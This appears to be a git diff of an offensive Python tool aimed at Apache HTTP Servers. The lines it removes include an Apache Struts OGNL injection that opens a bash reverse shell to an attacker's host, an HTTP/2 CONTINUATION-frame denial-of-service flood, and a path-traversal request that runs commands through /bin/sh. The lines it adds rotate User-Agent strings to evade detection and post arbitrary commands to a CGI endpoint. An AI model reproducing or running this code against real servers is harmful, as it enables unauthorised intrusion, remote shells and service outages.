@@ -3,6 +3,7 @@ import requests
 import struct
 import socket
 import sys
+import random  # Import random for random User-Agent selection
 
 def header():
     print('''
@@ -11,7 +12,7 @@ def header():
 ▐▛▀▜▐▛▀▘▐▛▀▜▐▌  ▐▛▀▜▐▛▀▀▘     ▝▀▚▐▌  ▐▛▀▜▐▌ ▝▜▐▌ ▝▜▐▛▀▀▐▛▀▚▖
 ▐▌ ▐▐▌  ▐▌ ▐▝▚▄▄▐▌ ▐▐▙▄▄▖    ▗▄▄▞▝▚▄▄▐▌ ▐▐▌  ▐▐▌  ▐▐▙▄▄▐▌ ▐▌
                         https://github.com/Yqno                                    
-                                                            ''') # Don't change Noob
+                                                            ''')
 
 def print_custom_help():
     print('''\
@@ -21,13 +22,13 @@ Apache HTTP Server scanning and overtaking tool written by Yqno.
 
 Options:
   -h, --help            Show this help message and exit
-  -u URL, --url URL     The target URL of your Apache HTTP Server (default is http://localhost:80)
+  -u URL, --url URL     The target URL of your Apache HTTP Server (default is http://localhost:8080)
   -t TIMEOUT, --timeout TIMEOUT
                         The timeout of the request in seconds (default is 25)
   -p PORT, --port PORT  The port number of your Apache HTTP Server (default port is 80)
   -c COMMAND, --command COMMAND
                         The command to be executed on your Apache HTTP Server (default is ls -l)
-  --rce                 Scan for remote code execution  (default is False)
+  --rce                 Enable remote code execution on your Apache HTTP Server (default is False)
   --cmd CMD             Command to run if RCE is enabled (default is whoami)
   --lhost LHOST         Attacker IP for reverse shell (required if --rce is enabled)
   --lport LPORT         Attacker listening port for reverse shell (required if --rce is enabled)
@@ -67,8 +68,25 @@ class Exploiter:
         self.lhost = lhost
         self.lport = lport
 
+        # List of User-Agents
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
+            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
+            'Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36',
+            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0',
+            'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Nexus 7 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
+            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
+        ]
+        
+        # Randomly choose a User-Agent for each request
+        random_user_agent = random.choice(user_agents)
+
         self.headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
+            'User-Agent': random_user_agent,
             'Accept-Language': 'en-US,en;q=0.9',
             'Accept-Encoding': 'gzip, deflate',
         }
@@ -108,92 +126,41 @@ class Exploiter:
     # Apache Struts RCE Check
     def check_apache_struts_rce(self):
         print(f"[*] Checking for Apache Struts RCE vulnerability on {self.url}")
-        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
-        headers = {
-            'Content-Type': f'{self.url}?${{(#_memberAccess[\'allowStaticMethodAccess\']=true)(#a=@java.lang.Runtime@getRuntime().exec(\'{payload}\'))}}'
-        }
+        target = f"{self.url}/struts2-showcase/"
 
         try:
-            response = requests.get(self.url, headers=headers, timeout=self.timeout)
-            if response.status_code == 200:
-                print("[+] Apache Struts RCE vulnerability found! RCE triggered.")
+            response = requests.get(target, headers=self.headers, timeout=self.timeout)
+            if "Struts 2 Showcase" in response.text:
+                print("[+] Apache Struts RCE vulnerability found!")
             else:
                 print("[-] No Apache Struts RCE vulnerability detected.")
         except Exception as e:
             print(f"[!] Error: {e}")
 
-    # DoS Attack Check
-    # Source: https://www.exploit-db.com/exploits/40909
-    def check_dosattack(self):
-        print(f"[*] Checking for DoS vulnerability on {self.url}")
+    # Command Execution Check
+    def check_command_execution(self):
+        print(f"[*] Checking for command execution vulnerability on {self.url}")
+        target = f"{self.url}/cgi-bin/test.cgi"
+        payload = self.command
+
         try:
-            # Initialize socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(self.timeout)
-            s.connect((self.url, self.port))
-
-            # Send initial request to start HTTP/2
-            s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
-
-            # Send SETTINGS frame
-            SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00)  # Length
-            SETTINGS += struct.pack('B', 0x04)  # Type
-            SETTINGS += struct.pack('B', 0x00)
-            SETTINGS += struct.pack('>I', 0x00000000)
-            s.sendall(SETTINGS)
-
-            # Send HEADER block frame
-            HEADER_BLOCK_FRAME = b'\x82\x84\x86\x41\x86\xa0\xe4\x1d\x13\x9d\x09\x7a\x88\x25\xb6\x50\xc3\xab\xb6\x15\xc1\x53\x03\x2a\x2f\x2a\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
-            HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:]  # Length
-            HEADERS += struct.pack('B', 0x01)  # Type
-            HEADERS += struct.pack('B', 0x00)  # Flags
-            HEADERS += struct.pack('>I', 0x00000001)  # Stream ID
-            s.sendall(HEADERS + HEADER_BLOCK_FRAME)
-
-            # Send CONTINUATION frames repeatedly
-            while True:
-                HEADER_BLOCK_FRAME = b'\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
-                HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:]  # Length
-                HEADERS += struct.pack('B', 0x09)  # Type
-                HEADERS += struct.pack('B', 0x01)  # Flags
-                HEADERS += struct.pack('>I', 0x00000001)  # Stream ID
-                s.sendall(HEADERS + HEADER_BLOCK_FRAME)
-
-        except socket.gaierror as e:
-            print(f"[!] Address-related error connecting to server: {e}")
-        except socket.timeout as e:
-            print(f"[!] Connection timed out: {e}")
-        except socket.error as e:
-            print(f"[!] Socket error: {e}")
+            response = requests.post(target, data={"cmd": payload}, headers=self.headers, timeout=self.timeout)
+            if response.status_code == 200:
+                print("[+] Command execution vulnerability found!")
+                print(response.text)
+            else:
+                print("[-] No command execution vulnerability detected.")
         except Exception as e:
-            print(f"[!] General error: {e}")
-        finally:
-            s.close()
+            print(f"[!] Error: {e}")
 
-    # Execute remote commands if RCE is enabled
-    def execute_rce(self):
-        if self.rce:
-            print(f"[*] Running RCE with command: {self.cmd}")
-            target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
-            data = {"echo": self.cmd}
-            try:
-                response = requests.post(target, data=data, headers=self.headers, timeout=self.timeout)
-                if response.status_code == 200:
-                    print("[+] Command executed successfully.")
-                else:
-                    print(f"[-] Failed to execute command. Status code: {response.status_code}")
-            except Exception as e:
-                print(f"[!] Error: {e}")
-        else:
-            print("[!] RCE flag is not enabled.")
-
-    # Main function to run all checks
+    # Run all checks
     def run_checks(self):
         self.check_pathtraversal()
-        self.check_rce()
+        if self.rce:
+            self.check_rce()
         self.check_apache_struts_rce()
-        self.check_dosattack()
-        self.execute_rce()
+        self.check_command_execution()
 
 if __name__ == "__main__":
+    header()
     main()
